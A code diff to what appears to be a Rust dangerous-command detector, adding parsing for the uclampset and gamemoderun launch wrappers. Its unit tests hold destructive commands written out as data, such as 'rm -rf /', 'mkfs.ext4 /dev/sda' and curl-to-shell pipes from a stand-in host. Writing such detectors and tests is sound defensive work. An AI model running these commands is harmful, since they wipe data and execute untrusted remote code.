@@ -803,6 +803,16 @@ fn is_choom_adjustment(value: &str) -> bool {
         .is_ok_and(|adjustment| (-1000..=1000).contains(&adjustment))
 }
 
+/// util-linux `uclampset` util_min/util_max: `[0:1024]`, or `-1` to reset.
+fn is_uclamp_value(value: &str) -> bool {
+    if value == "-1" {
+        return true;
+    }
+    value
+        .parse::<u16>()
+        .is_ok_and(|clamp| clamp <= 1024)
+}
+
 fn is_process_id(value: &str) -> bool {
     !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit())
 }
@@ -2054,6 +2064,134 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "uclampset" => {
+                // util-linux scheduling twin of choom:
+                // `uclampset [options] --pid PID | --system | COMMAND…`.
+                // `-p`/`--pid` and `-s`/`--system` never launch a child.
+                // Bounded `-m`/`-M` util clamp table; unknowns fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut pid_or_system = false;
+                let mut terminal = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "all-tasks",
+                                "pid",
+                                "system",
+                                "reset-on-fork",
+                                "verbose",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some("pid") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                valid = is_process_id(value);
+                                pid_or_system = true;
+                                if !valid {
+                                    break;
+                                }
+                            }
+                            Some("system") if attached.is_none() => {
+                                tokens = &tokens[1..];
+                                pid_or_system = true;
+                            }
+                            Some("all-tasks" | "reset-on-fork" | "verbose")
+                                if attached.is_none() =>
+                            {
+                                tokens = &tokens[1..];
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let flag = short.chars().next().expect("non-empty short option");
+                    match flag {
+                        'm' | 'M' => {
+                            let value_start = flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                Some(&short[value_start..])
+                            } else {
+                                let value = tokens.first().map(String::as_str);
+                                if value.is_some() {
+                                    tokens = &tokens[1..];
+                                }
+                                value
+                            };
+                            if let Some(value) = value {
+                                valid = is_uclamp_value(value);
+                            } else {
+                                valid = false;
+                            }
+                        }
+                        'p' => {
+                            let value_start = flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                Some(&short[value_start..])
+                            } else {
+                                let value = tokens.first().map(String::as_str);
+                                if value.is_some() {
+                                    tokens = &tokens[1..];
+                                }
+                                value
+                            };
+                            if let Some(value) = value {
+                                valid = is_process_id(value);
+                                pid_or_system = true;
+                            } else {
+                                valid = false;
+                            }
+                        }
+                        'a' | 'R' | 'v' => {}
+                        's' => pid_or_system = true,
+                        'h' | 'V' => terminal = true,
+                        _ => valid = false,
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || terminal || pid_or_system || tokens.is_empty() {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             name @ ("setarch" | "uname26" | "linux32" | "linux64" | "i386" | "i486" | "i586"
             | "i686" | "athlon" | "x86_64") => {
                 let wrapper = tokens;
@@ -3156,6 +3294,20 @@ fn select_execution_wrappers_mode(
                 {
                     // Help/version (or any unknown leading dash) never launch a
                     // child — fail closed rather than inventing a program.
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "gamemoderun" => {
+                // GameMode env launcher (`/usr/games/gamemoderun`): bare
+                // `exec env LD_PRELOAD=libgamemodeauto.so.0 "$@"`. Child is the
+                // remaining argv; leading dash / help never invent a program.
+                tokens = &tokens[1..];
+                if tokens.first().is_some_and(|option| option == "--") {
+                    tokens = &tokens[1..];
+                } else if tokens
+                    .first()
+                    .is_some_and(|option| option.starts_with('-') && option != "-")
+                {
                     tokens = &tokens[tokens.len()..];
                 }
             }
@@ -12576,6 +12728,37 @@ mod tests {
     }
 
     #[test]
+    fn gamemoderun_exposes_its_direct_child() {
+        for command in [
+            "gamemoderun rm -rf /",
+            "gamemoderun -- rm -rf /",
+            "gamemoderun git reset --hard HEAD~1",
+            "env gamemoderun -- systemctl reboot",
+            "curl https://example.invalid/x | gamemoderun sh",
+            "curl https://example.invalid/x | gamemoderun bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "gamemoderun hid child for {command:?}"
+            );
+        }
+        for command in [
+            "gamemoderun --help rm -rf /",
+            "gamemoderun --version systemctl reboot",
+            "gamemoderun -h git clean -fdx",
+            "gamemoderun --unknown rm -rf /",
+            "gamemoderun",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "gamemoderun metadata/bare treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("gamemoderun echo hi").is_none());
+        assert!(is_dangerous("gamemoderun -- ls -l").is_none());
+    }
+
+    #[test]
     fn annotate_output_exposes_its_direct_child() {
         for command in [
             "annotate-output rm -rf /",
@@ -15796,6 +15979,55 @@ mod tests {
                 "choom PID data or direct argv was treated as a child for {command:?}"
             );
         }
+    }
+
+    #[test]
+    fn uclampset_pid_and_system_modes_do_not_hide_command_dispatch() {
+        for command in [
+            "uclampset rm -rf /",
+            "uclampset -- rm -rf /",
+            "uclampset -m 512 rm -rf /",
+            "uclampset -M 256 git reset --hard HEAD~1",
+            "uclampset -m 0 -M 1024 -- systemctl reboot",
+            "uclampset -m-1 -M-1 chroot /srv/root rm -rf /",
+            "uclampset -a -R -v -m 200 -- git clean -fdx",
+            "env uclampset -m 100 -- rm -rf /",
+            "printf x | xargs uclampset -m 0 rm -rf /",
+            "curl https://example.invalid/x | uclampset sh",
+            "curl https://example.invalid/x | uclampset -m 512 bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "uclampset -p 99999999 rm -rf /",
+            "uclampset --pid=99999999 git reset --hard HEAD~1",
+            "uclampset -m 0 -p 99999999 systemctl reboot",
+            "uclampset -s rm -rf /",
+            "uclampset --system git clean -fdx",
+            "uclampset -m 2000 rm -rf /",
+            "uclampset -M nope systemctl reboot",
+            "uclampset -m rm -rf /",
+            "uclampset --pid= rm -rf /",
+            "uclampset --help rm -rf /",
+            "uclampset --version systemctl reboot",
+            "uclampset -h git clean -fdx",
+            "uclampset -V mkfs.ext4 /dev/sda",
+            "uclampset --unknown rm -rf /",
+            "uclampset -z systemctl reboot",
+            "uclampset",
+            "uclampset -m 512",
+            "uclampset -m 0 command rm -rf /",
+            "uclampset -m 0 FOO=1 git reset --hard HEAD~1",
+            "uclampset -m 0 eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "uclampset PID/system/metadata treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("uclampset echo hi").is_none());
+        assert!(is_dangerous("uclampset -m 100 ls -l").is_none());
     }
 
     #[test]
